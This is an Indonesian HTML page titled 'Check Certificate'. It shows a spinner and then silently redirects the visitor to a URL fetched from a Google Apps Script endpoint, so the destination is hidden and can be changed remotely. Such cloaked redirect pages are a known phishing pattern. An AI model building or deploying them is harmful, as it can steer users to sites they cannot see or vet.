<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Cek Sertifikat</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #ffffff;
      font-family: sans-serif;
    }

    /* CSS Spinner */
    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid #e0e0e0;
      border-top: 5px solid #007bff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <!-- Spinner Loading -->
  <div id="loader-container">
    <div class="spinner"></div>
  </div>

  <script>
    const GAS_URL = "https://script.google.com/macros/s/AKfycbxRmZ5163dQfhcYsuc1T6qX-HeMZqKMor-bL9FtT3tMyMkdxi9pDbcf2idy2yn7sRdu/exec";

    fetch(GAS_URL)
      .then(response => response.json())
      .then(data => {
        if (data && data.url) {
          // Langsung alihkan seluruh halaman ke URL target
          window.location.href = data.url;
        } else {
          throw new Error("URL tidak ditemukan pada respons.");
        }
      })
      .catch(error => {
        console.error("Gagal memuat URL:", error);
        document.getElementById('loader-container').innerHTML = 
          '<p style="color: #dc3545;">Gagal memuat halaman. Silakan muat ulang.</p>';
      });
  </script>

</body>
</html>
